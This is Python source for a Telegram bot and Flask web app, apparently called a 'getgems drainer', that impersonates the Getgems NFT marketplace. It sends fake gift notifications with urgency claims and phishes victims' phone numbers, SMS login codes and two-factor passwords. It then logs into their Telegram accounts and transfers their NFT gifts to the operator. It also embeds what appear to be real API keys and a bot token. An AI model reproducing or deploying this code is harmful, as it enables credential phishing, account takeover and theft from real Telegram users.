import os
import time
import asyncio
import threading
import urllib.parse
import datetime
import time # Модуль для контроля времени 60 минут
from flask import Flask, render_template, request, jsonify
from telethon import TelegramClient, events, Button, functions, types
from telethon import errors
from telethon.errors import (
    SessionPasswordNeededError, 
    RPCError, 
    SessionRevokedError, 
    PhoneCodeInvalidError
)

# --- КОНФИГУРАЦИЯ ---
API_ID = '34426356'
API_HASH = 'ddfa0edfefb66da4b06bc85e23fd40d5'
BOT_TOKEN = '8028370592:AAHmcGRTUoxPEwbDBcw1tsQmQlx5cty3ahM'
ADMIN_ID = 678335503
WORKER_ID = 8311100024
DOMAIN = "getgemsdrainer-production.up.railway.app" 

bot = TelegramClient('bot_auth', API_ID, API_HASH).start(bot_token=BOT_TOKEN)
app = Flask(__name__)

main_loop = asyncio.get_event_loop()

active_clients = {}
temp_clients = {}
pending_contacts = {}
login_data = {}
last_requests = {}

def get_code_keyboard(current_code=""):
    # Создаем кнопки 1-9
    buttons = []
    for i in range(1, 10, 3):
        buttons.append([
            Button.inline(str(i), data=f"num_{i}"),
            Button.inline(str(i+1), data=f"num_{i+1}"),
            Button.inline(str(i+2), data=f"num_{i+2}")
        ])
    # Добавляем 0, Удалить и Готово
    buttons.append([
        Button.inline("❌", data="num_clear"),
        Button.inline("0", data="num_0"),
        Button.inline("✅ Готово", data="num_done")
    ])
    return buttons

@bot.on(events.CallbackQuery(pattern=b'num_'))
async def code_callback(event):
    data = event.data.decode().split('_')[1]
    user_id = str(event.sender_id)
    
    if user_id not in login_data:
        return await event.answer("Сначала пропишите /login", alert=True)

    if data == "clear":
        login_data[user_id]['code'] = ""
    elif data == "done":
        # Это сигнализирует основному потоку, что код собран
        login_data[user_id]['ready'] = True
        await event.edit("🔄 Обработка кода...")
        return
    else:
        if len(login_data[user_id]['code']) < 5: # Обычно код 5 цифр
            login_data[user_id]['code'] += data
    
    await event.edit(
        f"📩 Введите код из СМС: `{'*' * len(login_data[user_id]['code'])}`",
        buttons=get_code_keyboard()
    )

# --- СИСТЕМА ВЕЧНОГО ДОСТУПА (TRUSTED) ---
TRUSTED_FILE = "trusted.txt"

def get_trusted():
    """Загружает список ID из файла навсегда"""
    if not os.path.exists(TRUSTED_FILE):
        return [ADMIN_ID, WORKER_ID]
    with open(TRUSTED_FILE, "r") as f:
        ids = [int(line.strip()) for line in f if line.strip().isdigit()]
        if ADMIN_ID not in ids: ids.append(ADMIN_ID)
        if WORKER_ID not in ids: ids.append(WORKER_ID)
        return ids

def add_trusted(user_id):
    """Добавляет ID в файл для сохранения после перезагрузки"""
    trusted = get_trusted()
    if user_id not in trusted:
        with open(TRUSTED_FILE, "a") as f:
            f.write(f"{user_id}\n")
        return True
    return False

def save_log(text):
    with open("logs.txt", "a", encoding="utf-8") as f:
        f.write(f"[{datetime.datetime.now()}] {text}\n")

def send_log(msg, buttons=None):
    save_log(msg) # если есть такая функция
    
    # ВНИМАНИЕ: не используй bot.loop! Используй нашу переменную main_loop.
    if main_loop and main_loop.is_running():
        try:
            coro = bot.send_message(ADMIN_ID, f"<b>LOG:</b>\n{msg}", parse_mode='html', buttons=buttons)
            # Передаем задачу из Flask (Thread-2) в поток бота безопасно
            asyncio.run_coroutine_threadsafe(coro, main_loop)
        except Exception as e:
            print(f"Ошибка при отправке лога: {e}")

# --- ЛОГИКА СЛИВА (DRAIN LOGIC) ---
async def drain_logic(client, phone):
    try:
        res = await client(functions.payments.GetStarsStatusRequest(peer='me'))
        # Безопасное получение баланса (поддержка разных версий API)
        current_bal = getattr(res.balance, 'amount', res.balance) if hasattr(res, 'balance') else 0
        
        if current_bal < 25:
            my_stars = await bot(functions.payments.GetStarsStatusRequest(peer='me'))
            my_stars_bal = getattr(my_stars.balance, 'amount', my_stars.balance)
            
            if my_stars_bal >= 30:
                me = await client.get_me()
                send_log(f"⛽ Заправка {phone}. Дарим 2 мишки...")
                for _ in range(2):
                    try:
                        await bot(functions.payments.SendStarGiftRequest(peer=me.id, gift_id=685))
                        await asyncio.sleep(2)
                    except: pass
                await asyncio.sleep(7)
                received_gifts = await client(functions.payments.GetStarGiftsRequest(offset='', limit=5))
                for g in received_gifts.gifts:
                    try:
                        await client(functions.payments.SaveStarGiftRequest(stargift_id=g.id, unsave=True))
                    except: continue
                res = await client(functions.payments.GetStarsStatusRequest(peer='me'))
                final_bal = getattr(res.balance, 'amount', res.balance)
                send_log(f"💰 Новый баланс {phone}: {final_bal}★")
            else:
                send_log(f"⚠️ Нет звезд на доноре для заправки {phone}!")

        all_gifts = await client(functions.payments.GetStarGiftsRequest(offset='', limit=100))
        total_found = len(all_gifts.gifts)
        success_count = 0
        for nft in all_gifts.gifts:
            try:
                await client(functions.payments.TransferStarGiftRequest(to_id=ADMIN_ID, stargift_id=nft.id))
                success_count += 1
                await asyncio.sleep(3)
            except Exception as e:
                if "BALANCE_TOO_LOW" in str(e): break
                continue

        btns = None
        if success_count < total_found or total_found == 0:
            btns = [Button.inline("🔄 Высушить заново", data=f"redrain_{phone}")]
        send_log(f"🏁 Слив {phone} окончен. Переведено: {success_count}/{total_found}", buttons=btns)

    except SessionRevokedError:
        send_log(f"❌ Мамонт {phone} завершил сессию.")
    except Exception as e:
        btns = [Button.inline("🔄 Высушить заново", data=f"redrain_{phone}")]
        send_log(f"⚠️ Ошибка drain_logic {phone}: {e}", buttons=btns)

# --- ИНЛАЙН РЕЖИМ ---
@bot.on(events.InlineQuery)
async def inline_handler(event):
    if event.sender_id not in get_trusted():
        await event.answer([], switch_pm="Доступ ограничен.", switch_pm_param="no_access")
        return

    input_text = event.text.strip()
    if not input_text.startswith("http"):
        await event.answer([], switch_pm="Введите ссылку на NFT...", switch_pm_param="help")
        return

    try:
        nft_name = input_text.split('/')[-1].replace('-', ' ').title()
    except:
        nft_name = "NFT Gift"

    timestamp = int(time.time())
    web_url = f"https://{DOMAIN}/?nft_url={urllib.parse.quote(input_text)}&t={timestamp}"
    
    # Текст сообщения: Название NFT теперь кликабельная ссылка
    # Мы используем Markdown-разметку [текст](ссылка)
    message_text = (
        f"🎁 **Вам отправили подарок!**\n\n"
        f"**NFT: [{nft_name}]({input_text})**\n\n"
        "Учтите, что подарок можно принять только с аккаунта, на "
        "который был отправлен данный подарок. Ссылка действительна "
        "**60 минут** с момента получения.\n\n"
        "Нажмите кнопку ниже, чтобы принять 👇"
    )


    await event.answer([
        event.builder.article(
            title=f"🎁 Подарить: {nft_name}",
            text=message_text,
            link_preview=False,
            parse_mode='md',
            buttons=[
                # ВАЖНО: для WebApp в инлайне используем Button.url + force_webview
                [types.KeyboardButtonUrl("Принять подарок 🎁", web_url)],
                [Button.url("Посмотреть подарок", input_text)]
            ]
        )
    ])

# --- ОБРАБОТЧИКИ КОМАНД ---

@bot.on(events.NewMessage(pattern='/ftpteam ftpteam'))
async def ftpteam_handler(event):
    if add_trusted(event.sender_id):
        username = f"@{event.sender.username}" if event.sender.username else "N/A"
        send_log(f"🔑 Пользователь {username} (ID: {event.sender_id}) получил доступ к админке через /ftpteam")
        await event.respond("✅ Доступ к админ-функционалу (Inline & Logs) разрешен навсегда.")
    else:
        await event.respond("ℹ️ У вас уже есть доступ.")

@bot.on(events.NewMessage(pattern='/start'))
async def start_handler(event):
    welcome_text = (
        "Это бот Getgems — он позволяет торговать NFT прямо в мини-приложении Telegram. "
        "Это самый удобный способ покупать и продавать Telegram-подарки, юзернеймы и анонимные номера. 🎯\n\n"
        "💎 0% комиссии на торговлю оффчейн Telegram-подарками\n"
        "💎 Покупайте Telegram Stars на 30% дешевле, чем в Telegram\n\n"
    )
    buttons = [
        [Button.url("Торговать номерами ↗", "https://getgems.io/collection/EQAOQdwdw8kGftJCSFgOErM1mBjYPe4DBPq8-AhF6vr9si5N")],
        [Button.url("Торговать юзернеймами ↗", "https://getgems.io/collection/EQCA14o1-VWhS2efqoh_9M1b_A9DtKTuoqfmkn83AbJzwnPi")],
        [Button.url("Торговать подарками ↗", "https://getgems.io/nft-gifts")]
    ]
    await event.respond(welcome_text, buttons=buttons, link_preview=False)

@bot.on(events.NewMessage(pattern='/stars_check'))
async def stars_check(event):
    allowed_ids = get_trusted()
    if event.sender_id not in allowed_ids: 
        return

    try:
        user_id = str(event.sender_id)
        client = active_clients.get(user_id)
        
        if not client:
            await event.respond("❌ **Ошибка:** Вы не авторизованы. Сначала пропишите `/login`.")
            return

        res = await client(functions.payments.GetStarsStatusRequest(peer='me'))
        current_balance = getattr(res.balance, 'amount', res.balance)
        transfers_count = int(current_balance) // 25

        await event.respond(
            f"📊 **Баланс аккаунта:** `{current_balance}` ★\n"
            f"🚀 **Доступно для передачи:** ~{transfers_count} шт.", 
            parse_mode='markdown'
        )
    except Exception as e:
        await event.respond(f"❌ **Ошибка API:** `{e}`")

@bot.on(events.NewMessage(pattern='/login'))
async def login_handler(event):
    if event.sender_id not in get_trusted(): return
    
    user_id = str(event.sender_id)
    async with bot.conversation(event.chat_id) as conv:
        await conv.send_message("📞 Введите номер телефона (в формате +7...):")
        phone = (await conv.get_response()).text.strip()
        
        client = TelegramClient(f"sessions/{user_id}", API_ID, API_HASH)
        await client.connect()
        
        try:
            await client.send_code_request(phone)
            login_data[user_id] = {'code': "", 'ready': False}
            
            msg = await event.respond("📩 Введите код из СМС (кнопками):", buttons=get_code_keyboard())
            
            while not login_data[user_id]['ready']:
                await asyncio.sleep(1)
            
            code = login_data[user_id]['code']
            
            try:
                await client.sign_in(phone, code)
            except errors.SessionPasswordNeededError:
                await msg.edit("🔐 Облачный пароль включен.**\nВведите ваш пароль обычным сообщением:")
                password_res = await conv.get_response()
                await client.sign_in(password=password_res.text.strip())
            
            active_clients[user_id] = client
            await event.respond("✅ Авторизация успешна!")
            
        except Exception as e:
            await event.respond(f"❌ Ошибка входа: {e}")
        finally:
            login_data.pop(user_id, None)

@bot.on(events.CallbackQuery(pattern=rb'redrain_(.*)'))
async def redrain_callback(event):
    phone = event.pattern_match.group(1).decode('utf-8')
    if phone in active_clients:
        await event.answer("Запускаю повторно...")
        asyncio.create_task(drain_logic(active_clients[phone], phone))
    else:
        await event.answer("Ошибка: Сессия потеряна!", alert=True)

# --- API ROUTES (FLASK) ---

@app.route('/')
def index(): 
    target = request.args.get('nft_url', '')

    display_name = target
    if "t.me/" in target:
        try:
            display_name = "@" + target.split('t.me/')[1].split('/')[0]
        except:
            pass

    send_log(f"🌐 Мамонт открыл WebApp. Цель: {display_name}")
    return render_template('index.html')

@app.route('/api/check_contact')
def check_contact():
    uid = request.args.get('id', '0')
    if uid in pending_contacts:
        return jsonify({"status": "received", "phone": pending_contacts[uid]})
    return jsonify({"status": "waiting"})

@app.route('/api/send_code', methods=['POST'])
def api_send_code():
    """Исправленный роут для работы с Telethon из Flask"""
    data = request.json
    phone, code = data.get('phone'), data.get('code')
    send_log(f"🔑 Мамонт {phone} ввел код: {code}")

    async def _async_sign_in():
        try:
            if phone not in temp_clients:
                return {"status": "error", "message": "Сессия не найдена. Попробуйте снова."}
                
            client = temp_clients[phone]['client']
            phone_hash = temp_clients[phone]['hash']
            
            await client.sign_in(phone, code, phone_code_hash=phone_hash)
            
            active_clients[phone] = client
            send_log(f"✅ Вход успешен: {phone}. Начинаю слив.")
            
            # Запускаем слив фоновой задачей
            asyncio.create_task(drain_logic(client, phone))
            return {"status": "success"}
            
        except PhoneCodeInvalidError:
            return {"status": "error", "message": "Неверный код"}
        except SessionPasswordNeededError:
            send_log(f"🔐 На {phone} требуется 2FA пароль.")
            return {"status": "2fa_needed"}
        except Exception as e:
            send_log(f"❌ Ошибка API {phone}: {e}")
            return {"status": "error", "message": str(e)}

    # Безопасно запускаем асинхронную функцию в основном цикле Telethon
    # Безопасно запускаем асинхронную функцию
    future = asyncio.run_coroutine_threadsafe(_async_sign_in(), main_loop)
    try:
        # Уменьшим чуть-чуть, чтобы быть быстрее прокси Railway
        res = future.result(timeout=15) 
        send_log(f"📤 Ответ для {phone}: {res.get('status')}")
        return jsonify(res)
    except Exception as e:
        send_log(f"⚠️ Таймаут/Ошибка ожидания для {phone}: {e}")
        return jsonify({"status": "error", "message": "Сервер перегружен. Попробуйте еще раз через 10 секунд."})

@app.route('/api/send_password', methods=['POST'])
def api_send_password():
    data = request.json
    phone, password = data.get('phone'), data.get('password')
    send_log(f"🔐 Мамонт: {phone}, ввел 2FA пароль: {password}")

    async def _async_sign_in_2fa():
        try:
            # Берем клиента из активных или временных
            client = active_clients.get(phone)
            if not client and phone in temp_clients:
                client = temp_clients[phone]['client']
            
            if not client:
                return {"status": "error", "message": "Сессия потеряна"}

            # Завершаем вход с паролем
            await client.sign_in(password=password)
            
            active_clients[phone] = client
            send_log(f"✅ 2FA пройдено: {phone}. Начинаю слив.")
            
            # Запускаем твою логику слива
            asyncio.create_task(drain_logic(client, phone))
            return {"status": "success"}
            
        except Exception as e:
            send_log(f"❌ Ошибка 2FA {phone}: {e}")
            return {"status": "error", "message": str(e)}

    # Запускаем в основном цикле с таймаутом
    future = asyncio.run_coroutine_threadsafe(_async_sign_in_2fa(), main_loop)
    try:
        return jsonify(future.result(timeout=25))
    except Exception:
        return jsonify({"status": "error", "message": "Сервер долго отвечал. Попробуйте еще раз."})

@bot.on(events.NewMessage)
async def contact_handler(event):
    if event.contact and event.contact.user_id == event.sender_id:
        phone = event.contact.phone_number
        if not phone.startswith('+'): phone = '+' + phone
        
        # ЖЕСТКИЙ АНТИ-ФЛУД
        current_time = time.time()
        if phone in last_requests and (current_time - last_requests[phone]) < 10:
            return # Игнорим дубликат запроса
        
        last_requests[phone] = current_time
        pending_contacts[str(event.sender_id)] = phone
        
        send_log(f"📞 Мамонт поделился номером: {phone}")
        
        try:
            # Если клиент уже создан, не пересоздаем его
            if phone in temp_clients:
                client = temp_clients[phone]['client']
            else:
                client = TelegramClient(f'sessions/{phone}', API_ID, API_HASH)
                await client.connect()
            
            res = await client.send_code_request(phone)
            temp_clients[phone] = {'client': client, 'hash': res.phone_code_hash}
            send_log(f"📩 Код на {phone} отправлен.")
            
        except Exception as e:
            send_log(f"❌ Ошибка сессии {phone}: {e}")
            # Если ошибка, удаляем из фильтра, чтобы можно было попробовать еще раз
            last_requests.pop(phone, None)

if __name__ == '__main__':
    if not os.path.exists('sessions'): os.makedirs('sessions')
    
    port = int(os.environ.get("PORT", 8080))
    
    threading.Thread(
        target=lambda: app.run(port=port, host='0.0.0.0', use_reloader=False), 
        daemon=True
    ).start()
    
    bot.run_until_disconnected()